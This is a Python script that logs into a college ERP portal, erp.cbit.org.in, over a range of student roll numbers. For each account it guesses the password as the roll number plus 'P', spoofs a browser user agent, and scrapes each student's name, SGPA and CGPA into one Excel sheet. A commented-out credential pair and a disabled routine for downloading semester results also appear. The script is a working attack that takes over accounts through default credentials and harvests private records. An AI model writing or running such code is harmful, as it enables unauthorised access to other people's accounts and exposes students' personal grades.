import sys
from fake_user_agent.main import user_agent
import  requests
from bs4 import BeautifulSoup
import pandas as pd
#user agen headers for entering the website
ua=user_agent('chrome')
df=pd.DataFrame(columns=['NAME','SGPA','CGPA'])
for roll in range(160120737061,160120737121):
    username=str(roll)+'P'
    password=str(roll)+'P'
    headers={'User-Agent':str(ua)}
    with requests.Session() as s:
        url="https://erp.cbit.org.in/beeserp/Login.aspx"
        g=s.get(url,headers=headers)
        src=g.content
        soup=BeautifulSoup(src,'lxml')
        lis=soup.find_all('input',{'type':'hidden'})
        a=[]
        for i in lis:
            a.append(i.attrs['value'])
        # your ERP Website credentials
        # username='160120737109P'
        # password='160120737109P'
        # print(a)

        payload={'__VIEWSTATE':a[3],'__VIEWSTATEGENERATOR':a[4],'__EVENTVALIDATION':a[5],'txtUserName':username,'btnNext':'Next'}
        post2 = s.post('https://erp.cbit.org.in/beeserp/login.aspx', data=payload,allow_redirects=True)

        # print('successfully bypassed username page')
        # with open ('username.html','w')as f:
        #     f.write(post2.text)
        res=post2.content
        soup1=BeautifulSoup(res,'lxml')
        lis1=soup1.find_all('input',{'type':'hidden'})
        b=[]
        for i in lis1:
            b.append(i.attrs['value'])

        payload1 = { '__VIEWSTATE': b[0],
                   '__VIEWSTATEGENERATOR': b[1], '__EVENTVALIDATION': b[2],'txtPassword': password, 'btnSubmit':'Submit'
                   }
        # print(post2.request.url)
        post1 = s.post(post2.request.url, data=payload1)

        # print('suceesfully bypassed password page')
        # with open ('password.html','w')as f:
        #     f.write(post1.text)
        #https://erp.cbit.org.in/beeserp/StudentLogin/Student/OverallResultStudent.aspx
        #https://erp.cbit.org.in/beeserp/StudentLogin/Student/OverallMarksSemwise.aspx
        overall_result=s.get('https://erp.cbit.org.in/beeserp/StudentLogin/Student/OverallResultStudent.aspx')
        # with open ('testting.html','w')as f:
        #     f.write(overall_result.text)
            # additional work
        rslt_page=overall_result.content
        parser=BeautifulSoup(rslt_page,'lxml')
        final_list=parser.find_all('tr',{'valign':'middle'})
        name=parser.find('span',{'id':'ctl00_cpHeader_ucStudCorner_lblStudentName'})
        name=name.string.replace('WELCOME','').strip()
        container=final_list[-1].find_all('td')[2:4]

        df.loc[len(df.index)] = [name,container[0].string,container[1].string]
        print(name+' has been inserted into dataframe')
df.to_excel('everyone.xlsx')

    # while(True):
    #     sem=input('enter the semister you want to fetch the results')
    #     print('\n')
    #     opt=input('enter 2 for official certificate(this takes a while to download) or enter 1 for  retrival of result in csv format or enter 3 for only sgpa n cgpa(FASTER)')
    #     if(opt=='2'):
    #         print('It Can Take A While Be Patient')
    #         semwise=overall_result.content
    #         soup2=BeautifulSoup(semwise,'lxml')
    #         lis2=soup2.find_all('input',{'type':'hidden'})
    #         value=[]
    #         for x in lis2:
    #             value.append(x.attrs['value'])
    #
    #         button_value='ctl00$cpStud$btn'+sem
    #         if (sem=='1'):
    #             sem_val='I '
    #         elif (sem=='2'):
    #             sem_val='II '
    #         elif (sem=='3'):
    #             sem_val='III '
    #         elif (sem=='4'):
    #             sem_val='IV '
    #         elif (sem=='5'):
    #             sem_val='V '
    #         elif (sem=='6'):
    #             sem_val='VI '
    #         elif (sem=='7'):
    #             sem_val='VII '
    #         elif (sem=='8'):
    #             sem_val='VIII '
    #         else:
    #             print('Enter a valid Semister!!!')
    #             sys.exit()
    #         btn_val=sem_val+'SEM'
    #         payload2={'__VIEWSTATE':value[0],'__VIEWSTATEGENERATOR':value[1],button_value:btn_val}
    #         sem_page=s.post(overall_result.request.url,data=payload2)
    #         # print('succesfully submited given sem value')
    #         # tables=pd.read_html(sem_page.text)
    #         # print(tables[6])
    #         with open('final.html','w' ) as f:
    #             f.write(sem_page.text)
    #         #printing out the certificate
    #         semwise = sem_page.content
    #         soup2 = BeautifulSoup(semwise, 'lxml')
    #         lis2 = soup2.find_all('input', {'type': 'hidden'})
    #         value = []
    #         for x in lis2:
    #             value.append(x.attrs['value'])
    #
    #
    #         payload2 = {'__VIEWSTATE': value[0], '__VIEWSTATEGENERATOR': value[1], 'ctl00$cpStud$btnExport': 'Print Overall Marks'}
    #         sem_page1=s.post(sem_page.request.url,data=payload2,allow_redirects=True)
    #         # print('succesfully submited download link')
    #         with open(sem+' SEM result.pdf','wb') as f:
    #             f.write(sem_page1.content)
    #         print('\n')
    #         print('Downloaded SuccesFully!!!')
    #         print('\n')
    #
    #         print('NOTE: if empty value Certificate is Downloaded then you Either  didnt write exam or results are not yet declared')
    #     if(opt=='1'):
    #         semwise = overall_result.content
    #         soup2 = BeautifulSoup(semwise, 'lxml')
    #         lis2 = soup2.find_all('input', {'type': 'hidden'})
    #         value = []
    #         with open('content.html','w') as f:
    #             f.write(overall_result.text)
    #         for x in lis2:
    #             value.append(x.attrs['value'])
    #         print(len(value))
    #         button_value = 'ctl00$cpStud$btn' + sem
    #         if (sem == '1'):
    #             sem_val = 'I '
    #         elif (sem == '2'):
    #             sem_val = 'II '
    #         elif (sem == '3'):
    #             sem_val = 'III '
    #         elif (sem == '4'):
    #             sem_val = 'IV '
    #         elif (sem == '5'):
    #             sem_val = 'V '
    #         elif (sem == '6'):
    #             sem_val = 'VI '
    #         elif (sem == '7'):
    #             sem_val = 'VII '
    #         elif (sem == '8'):
    #             sem_val = 'VIII '
    #         else:
    #             print('Enter a valid Semister!!!')
    #             sys.exit()
    #         print('Wait a minute........')
    #         btn_val = sem_val + 'SEM'
    #         payload2 = {'__VIEWSTATE': value[0], '__VIEWSTATEGENERATOR': value[1], button_value: btn_val}
    #         sem_page = s.post(overall_result.request.url, data=payload2)
    #         with open('final.html','w' ) as f:
    #             f.write(sem_page.text)
    #         # print('succesfully submited given sem value')
    #         soup2=BeautifulSoup(sem_page.content,'lxml')
    #         gpa=soup2.find_all(class_='MessageLabelRed')
    #         # print(gpa)
    #         cgpa=gpa[4].text
    #         sgpa=gpa[3].text
    #
    #         tables=pd.read_html(sem_page.text)
    #
    #
    #         tables[6].loc[len(tables[6].index)]=['','',sgpa,cgpa,'','','']
    #         print('downloading the result.......')
    #         tables[6].to_csv(btn_val+' result.csv')
    #         print('succesfuly downloaded')
    #     if(opt=='3'):
    #         semwise = overall_result.content
    #         soup2 = BeautifulSoup(semwise, 'lxml')
    #         lis2 = soup2.find_all('input', {'type': 'hidden'})
    #         value = []
    #         for x in lis2:
    #             value.append(x.attrs['value'])
    #
    #         button_value = 'ctl00$cpStud$btn' + sem
    #         if (sem == '1'):
    #             sem_val = 'I '
    #         elif (sem == '2'):
    #             sem_val = 'II '
    #         elif (sem == '3'):
    #             sem_val = 'III '
    #         elif (sem == '4'):
    #             sem_val = 'IV '
    #         elif (sem == '5'):
    #             sem_val = 'V '
    #         elif (sem == '6'):
    #             sem_val = 'VI '
    #         elif (sem == '7'):
    #             sem_val = 'VII '
    #         elif (sem == '8'):
    #             sem_val = 'VIII '
    #         else:
    #             print('Enter a valid Semister!!!')
    #             sys.exit()
    #         print('Wait a minute........')
    #         btn_val = sem_val + 'SEM'
    #         payload2 = {'__VIEWSTATE': value[0], '__VIEWSTATEGENERATOR': value[1], button_value: btn_val}
    #         sem_page = s.post(overall_result.request.url, data=payload2)
    #         with open('final.html','w' ) as f:
    #             f.write(sem_page.text)
    #         # print('succesfully submited given sem value')
    #         soup2 = BeautifulSoup(sem_page.content, 'lxml')
    #         gpa = soup2.find_all(class_='MessageLabelRed')
    #         print(gpa)
    #         # cgpa = gpa[4].text
    #         # sgpa = gpa[3].text
    #         # print(str(sgpa))
    #         # print( str(cgpa))
    #
    #
    #
    #
